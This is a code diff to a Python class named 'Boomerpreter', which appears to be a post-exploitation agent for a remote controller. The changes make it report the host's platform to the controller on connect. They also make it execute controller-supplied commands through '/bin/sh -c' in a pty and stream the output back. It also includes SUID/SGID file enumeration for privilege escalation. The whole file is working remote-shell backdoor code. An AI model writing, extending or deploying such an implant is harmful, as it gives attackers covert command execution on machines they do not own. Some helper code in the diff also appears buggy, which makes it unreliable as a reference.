@@ -7,6 +7,7 @@ import os
 import sys
 import time
 import threading
+import platform
 
 try:
     import pty
@@ -25,6 +26,7 @@ class Boomerpreter:
     def __init__(self,s):
         self.socket = s
         self.channel = None
+        self.platform_os = platform.platform()
         self.py_version = 3 if python_version().startswith("3") else 2
         self.options = {
         "suid_sgid": ["get_suid_sgid", True],
@@ -33,10 +35,9 @@ class Boomerpreter:
         }
 
     def run(self):
+        self.socket.send(self.platform_os.encode())
         while True:
             data_rcv = self.socket.recv(1024)
-            if self.py_version == 3:
-                data_rcv = data_rcv.decode()
             data_rcv = data_rcv.split()
             try:
                 opt = self.options[data_rcv[0]]
@@ -54,7 +55,18 @@ class Boomerpreter:
                 continue
             if "exit" == data:
                 break
-            self.socket.send(data)
+            self.send_data(data)
+
+    def recv_data(self):
+        data = self.socket.recv(1024)
+        if self.py_version == 3:
+            data = data.encode()
+        return data
+    
+    def send_data(self, data):
+        if self.py_version == 3:
+            data = data.encode()
+        self.socket.send(data)
 
     def get_suid_sgid(self, request):
         my_dir = request
@@ -97,7 +109,7 @@ class Boomerpreter:
     
     def get_shell(self, request="/bin/sh"):
         if has_pty:
-            cmd = request.split()
+            cmd = ['/bin/sh', '-c', request] 
             master, slave = pty.openpty()
             if has_termios:
                 settings = termios.tcgetattr(master)
@@ -108,16 +120,16 @@ class Boomerpreter:
             channel.stdout = os.fdopen(master, 'rb')
             channel.stderr = open(os.devnull, 'rb')
             channel.start()
-            i = True
+            read = True
             while True:
-                if not i:
+                if not read:
                     recv = self.socket.recv(1024)
                     if len(recv) == 0:
                         break
                     if "exit" in recv:
                         return None
                     channel.write(recv)
-                i = False
+                read = False
                 data = bytes()
                 if channel.stderr_reader.is_read_ready():
                     data = channel.stderr_reader.read()
@@ -127,10 +139,10 @@ class Boomerpreter:
                     self.socket.send(b"bye")
                     return None
                 if data:
-                    self.socket.send(data)
+                    self.socket.sendall(data)
                 else:
-                    i = True
-                time.sleep(0.5)
+                    read = True
+                time.sleep(1)
         else:
             return "No"
 
